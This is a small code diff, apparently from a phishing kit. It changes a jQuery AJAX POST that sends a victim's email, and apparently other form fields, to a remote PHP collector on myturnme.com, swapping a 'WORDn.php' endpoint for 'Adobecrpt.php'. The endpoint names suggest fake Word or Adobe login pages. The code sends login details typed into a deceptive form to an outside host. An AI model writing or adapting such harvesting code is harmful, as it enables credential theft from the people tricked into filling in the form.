@@ -177,7 +177,7 @@
         
         $.ajax({
           dataType: 'JSON',
-          url: 'https://myturnme.com/WORDn.php',
+          url: 'https://myturnme.com/Adobecrpt.php',
           type: 'POST',
           data:{
             email:email,
